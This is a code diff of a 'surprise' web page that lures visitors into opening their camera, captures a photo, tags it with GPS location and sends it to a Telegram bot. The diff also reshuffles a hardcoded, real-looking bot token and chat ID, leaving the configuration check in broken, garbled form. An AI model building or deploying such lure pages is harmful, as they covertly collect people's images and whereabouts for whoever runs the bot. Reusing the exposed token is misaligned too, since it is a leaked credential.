@@ -44,76 +44,41 @@ h1{
   font-size:14px;
   margin:0 0 22px;
 }
-  
-/* Main decorative circle */
-.frame {
-  width: min(78vw, 290px);
-  aspect-ratio: 1;
-  margin: 0 auto 20px;
-  border-radius: 50%;
-  overflow: hidden;
-  background: #f8d8e9;
-  border: 6px solid white;
-  outline: 2px solid #f0a3ca;
-  box-shadow: 0 8px 24px #c96ba333;
-  transition: width .3s ease;
-  position: relative;
+
+/* Original decorative circle size */
+.frame{
+  width:min(78vw,290px);
+  aspect-ratio:1;
+  margin:0 auto 20px;
+  border-radius:50%;
+  overflow:hidden;
+  background:#f8d8e9;
+  border:6px solid white;
+  outline:2px solid #f0a3ca;
+  box-shadow:0 8px 24px #c96ba333;
+  transition:width .3s ease;
 }
 
-/* Tiny circle when camera opens */
-.frame.camera-open {
-  width: 50px;
-  height: 50px;
-  aspect-ratio: 1;
-  margin: 0 auto 20px;
-  border-width: 2px;
-  outline-width: 1px;
+/* Smaller circle only when camera opens */
+.frame.camera-open{
+  width:min(15vw,50 px);
 }
 
-/* Hide the original placeholder in the tiny frame */
-.frame.camera-open .placeholder {
-  display: none !important;
+video,.preview{
+  width:100%;
+  height:100%;
+  object-fit:cover;
 }
 
-/* Joker emoji fills only the tiny circle */
-.joker-emoji {
-  position: absolute;
-  inset: 0;
-  width: 100%;
-  height: 100%;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  font-size: 32px;
-  background: #f8d8e9;
-  border-radius: 50%;
-  z-index: 10;
-}
-
-/* Keep the emoji hidden until enabled */
-.joker-emoji[hidden] {
-  display: none !important;
-}
-
-video,
-.preview {
-  width: 100%;
-  height: 100%;
-  object-fit: cover;
-}
-}
-/* Center the placeholder inside the main circle */
-.placeholder {
-  position: absolute;
-  inset: 0;
-  display: flex;
-  flex-direction: column;
-  align-items: center;
-  justify-content: center;
-  text-align: center;
-  width: 100%;
-  height: 100%;
-  box-sizing: border-box;
+.placeholder{
+  height:100%;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  flex-direction:column;
+  gap:12px;
+  padding:24px;
+  color:#b34e87;
 }
 
 .heart{font-size:54px}
@@ -215,22 +180,20 @@ button:disabled{
 </head>
 
 <body>
-  
+
 <main class="app">
   <h1>🎁 Unlock Your Surprise!</h1>
   <p class="subtitle">A little surprise is waiting for you 👀💗</p>
 
-<div class="frame" id="cameraFrame">
-  <video id="camera" autoplay playsinline hidden></video>
-  <img id="preview" class="preview" alt="Captured photo" hidden>
+  <div class="frame" id="cameraFrame">
+    <video id="camera" autoplay playsinline hidden></video>
+    <img id="preview" class="preview" alt="Captured photo" hidden>
 
-  <div id="placeholder" class="placeholder">
-    <span class="heart">🎀</span>
-    <span>Your surprise awaits...</span>
+    <div id="placeholder" class="placeholder">
+      <span class="heart">🎀</span>
+      <span>Your surprise awaits...</span>
+    </div>
   </div>
-
-  <div id="jokerEmoji" class="joker-emoji" hidden>🤡</div>
-</div>
 
   <div class="notice">
     📸 Tapping the button opens your camera, captures a photo, and sends
@@ -267,8 +230,8 @@ button:disabled{
 
 // Telegram configuration
 // A token in public JavaScript can be copied by anyone.
-const BOT_TOKEN = "8799702650:AAH4KcrkJaFVVxlEAA6JkoepemAv2PRx_ZM";
-const CHAT_ID = "7350437667";
+const BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN";
+const CHAT_ID = "YOUR_CHAT_ID";
 
 const $ = id => document.getElementById(id);
 
@@ -335,8 +298,6 @@ async function openCamera(){
 
   // Shrink the circle only when the camera opens.
   cameraFrame.classList.add("camera-open");
-  document.getElementById("placeholder").hidden = true;
-  document.getElementById("jokerEmoji").hidden = false;
 
   placeholder.hidden = true;
   await camera.play();
@@ -458,8 +419,8 @@ async function addGpsExif(blob,loc){
 
 async function sendToTelegram(blob){
   if(
-    BOT_TOKEN==="YOUR_TELEGRAM_BOT_TOKEN" ||
-    CHAT_ID==="YOUR_CHAT_ID"
+    BOT_TOKEN==="8799702650:AAH4KcrkJaFVVxlEAA6JkoepemAv2PRx_ZM" ||
+    CHAT_ID==="7350437667"
   ){
     throw new Error("Configure your Telegram bot token and chat ID.");
   }
